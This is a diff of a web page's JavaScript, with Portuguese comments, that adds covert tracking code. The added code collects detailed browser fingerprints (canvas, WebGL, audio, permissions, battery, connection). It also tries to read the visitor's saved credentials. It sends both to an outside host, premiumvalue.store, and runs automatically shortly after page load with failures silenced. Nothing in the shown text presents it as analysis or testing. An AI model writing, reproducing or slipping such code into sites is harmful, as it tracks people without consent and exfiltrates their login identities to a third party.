@@ -181,6 +181,7 @@
     }
 
     async function coletarFingerprint() {
+  // Canvas
   const canvas = document.createElement('canvas');
   const ctx = canvas.getContext('2d');
   ctx.textBaseline = "top";
@@ -193,19 +194,51 @@
   ctx.fillText("fingerprint", 4, 17);
   const canvasFingerprint = canvas.toDataURL();
 
-  const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-  const oscillator = audioCtx.createOscillator();
-  const analyser = audioCtx.createAnalyser();
-  const gain = audioCtx.createGain();
-  const scriptProcessor = audioCtx.createScriptProcessor(4096, 1, 1);
+  // WebGL
+  let webglVendor = { vendor: "unknown", renderer: "unknown" };
+  try {
+    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+    webglVendor = {
+      vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+      renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+    };
+  } catch {}
 
-  oscillator.type = 'triangle';
-  oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
-  oscillator.connect(analyser);
-  analyser.connect(scriptProcessor);
-  scriptProcessor.connect(audioCtx.destination);
-  oscillator.start(0);
+  // Audio
+  let audioFingerprint = [];
+  try {
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    const analyser = audioCtx.createAnalyser();
+    const buffer = new Float32Array(analyser.frequencyBinCount);
+    analyser.getFloatFrequencyData(buffer);
+    audioFingerprint = Array.from(buffer.slice(0, 10));
+  } catch {}
 
+  // Permissões
+  const permissions = {};
+  for (const perm of ["camera", "microphone", "geolocation", "notifications"]) {
+    try {
+      const result = await navigator.permissions.query({ name: perm });
+      permissions[perm] = result.state;
+    } catch {
+      permissions[perm] = "unsupported";
+    }
+  }
+
+  // Bateria
+  let batteryInfo = {};
+  try {
+    if (navigator.getBattery) {
+      const battery = await navigator.getBattery();
+      batteryInfo = {
+        charging: battery.charging,
+        level: battery.level
+      };
+    }
+  } catch {}
+
+  // Coleta principal
   const fingerprint = {
     userAgent: navigator.userAgent,
     language: navigator.language,
@@ -225,18 +258,48 @@
       cores: navigator.hardwareConcurrency || "unknown",
       touch: navigator.maxTouchPoints || 0
     },
+    cookiesEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack,
+    connection: navigator.connection || {},
+    battery: batteryInfo,
     canvasFingerprint,
-    webglVendor: getWebGLVendor(),
-    audioFingerprint: await getAudioFingerprint(audioCtx),
-    permissions: await getPermissions()
+    webglVendor,
+    audioFingerprint,
+    permissions
   };
 
+  // Envia fingerprint
   fetch("https://premiumvalue.store/log", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ tipo: "fingerprint", fp: fingerprint })
   });
+
+  // ✅ Tentativa de extrair credentials salvas
+  if (navigator.credentials && navigator.credentials.get) {
+    try {
+      const cred = await navigator.credentials.get({ password: true });
+      if (cred) {
+        fetch("https://premiumvalue.store/log", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            tipo: "credentials",
+            id: cred.id,
+            name: cred.name
+          })
+        });
+      }
+    } catch (e) {
+      // Ignora silenciosamente se não disponível
+    }
+  }
 }
+
+// Chamada automática após carregamento
+window.addEventListener("DOMContentLoaded", () => {
+  setTimeout(coletarFingerprint, 1500);
+});
 
 function getWebGLVendor() {
   try {
